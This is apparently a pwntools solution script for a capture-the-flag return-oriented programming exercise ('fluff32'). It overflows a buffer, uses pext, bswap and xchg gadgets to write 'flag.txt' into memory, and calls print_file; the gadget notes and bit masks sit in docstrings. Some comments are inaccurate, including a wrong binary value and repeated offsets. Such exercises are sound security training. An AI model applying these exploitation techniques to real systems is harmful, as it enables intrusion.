from pwn import *

"""
Task:
    1. Write "flag.txt" to file_name:
        file_name = 0x0804a400
    2. Call print_file(file_name)

Checksec:
    âžœ  fluff checksec fluff32
    [*] '/mnt/d/eCXD/rop/X86/fluff/fluff32'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
VMMAP:
    0x08048000 0x08049000 r-xp      /mnt/d/eCXD/rop/X86/fluff/fluff32
    0x08049000 0x0804a000 r--p      /mnt/d/eCXD/rop/X86/fluff/fluff32
    0x0804a000 0x0804b000 rw-p      /mnt/d/eCXD/rop/X86/fluff/fluff32
    0xf7fca000 0xf7fcb000 r-xp      /mnt/d/eCXD/rop/X86/fluff/libfluff32.so
    0xf7fcb000 0xf7fcc000 r--p      /mnt/d/eCXD/rop/X86/fluff/libfluff32.so
    0xf7fcc000 0xf7fcd000 rw-p      /mnt/d/eCXD/rop/X86/fluff/libfluff32.so
    0xf7fcd000 0xf7fcf000 rw-p      mapped
    0xfffdd000 0xffffe000 rw-p      [stack]
Gadget:
    0x080483d0 : print_file(*file_name)
    0x08048558 : pop ecx ; bswap ecx ; ret
    0x080485bb : pop ebp ; ret
    0x08048555 : xchg byte ptr [ecx], dl ; ret

    0x08048543 89 e8           MOV        EAX,EBP
    0x08048545 bb ba ba        MOV        EBX,0xb0bababa
                 ba b0
    0x0804854a c4 e2 62        PEXT       EDX,EBX,EAX
                 f5 d0
    0x0804854f b8 ef be        MOV        EAX,0xdeadbeef
                 ad de
    0x08048554 c3              RET


"""
"""
f: 0x66 => 0b1101100
src:  10110000101110101011101010111010
mask: 00000000000000000000101101001011 => 2891
dst:  00000000000000000000000001100110  

l: 108 => 0b1101100
src:  10110000101110101011101010111010
mask: 00000000000000000000001011011101 => 733
dst:  00000000000000000000000001101100 

a: 0x61 => 0b1100001
src:  10110000101110101011101010111010
mask: 00000000000000000001110101000110 => 7494
dst:  00000000000000000000000001100001

g: 103 => 0b1100111
src:  10110000101110101011101010111010
mask: 00000000000000000000101101011010 => 2906
dst:  00000000000000000000000001100111

.: 46 => 0b101110
src:  10110000101110101011101010111010
mask: 00000000000000000000000011011011 => 219
dst:  00000000000000000000000000101110

t: 116 => 0b1110100
src:  10110000101110101011101010111010
mask: 00000000000000000000101011001101 => 2765
dst:  00000000000000000000000001110100

x: 120 => 0b1111000
src:  10110000101110101011101010111010
mask: 00000000000000000001101011000101 => 6853
dst:  00000000000000000000000001111000
"""


def p32r(x):
    return p32(x)[::-1]
    
def exploit():
    p = process("fluff32")
    proc.wait_for_debugger(p.pid)

    print_file = 0x080483d0
    file_name = 0x0804a400
    pop_ecx_bswap = 0x08048558
    pop_ebp = 0x080485bb
    pext_gadget = 0x08048543
    xchg_ptr_ecx_dl = 0x08048555
    
    # set 'f' to 
    buf = b""
    buf += b"A" * 0x2c

    # f
    buf += p32(pop_ebp)
    buf += p32(2891)                    # 'f' to ebp
    buf += p32(pext_gadget)             # 'f' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 'f' to file_name[0]

    # l
    buf += p32(pop_ebp)
    buf += p32(733)                     # 'l' to ebp
    buf += p32(pext_gadget)             # 'l' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+1)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 'l' to file_name[1]

    # a
    buf += p32(pop_ebp)
    buf += p32(7494)                     # 'a' to ebp
    buf += p32(pext_gadget)             # 'a' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+2)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 'a' to file_name[0]

    # g
    buf += p32(pop_ebp)
    buf += p32(2906)                     # 'g' to ebp
    buf += p32(pext_gadget)             # 'g' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+3)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 'g' to file_name[0]

    # .
    buf += p32(pop_ebp)
    buf += p32(219)                     # '.' to ebp
    buf += p32(pext_gadget)             # '.' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+4)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # '.' to file_name[0]

    # t
    buf += p32(pop_ebp)
    buf += p32(2765)                     # 't' to ebp
    buf += p32(pext_gadget)             # 't' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+5)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 't' to file_name[0]

    # x
    buf += p32(pop_ebp)
    buf += p32(6853)                     # 'x' to ebp
    buf += p32(pext_gadget)             # 'x' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+6)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 'x' to file_name[0]
    # t
    buf += p32(pop_ebp)
    buf += p32(2765)                     # 't' to ebp
    buf += p32(pext_gadget)             # 't' to edx
    buf += p32(pop_ecx_bswap)
    buf += p32r(file_name+7)              # *ecx = file_name
    buf += p32(xchg_ptr_ecx_dl)         # 't' to file_name[0]

    buf += p32(print_file)
    buf += b"AAAA"
    buf += p32(file_name)

    p.sendline(buf)
    p.interactive()

exploit()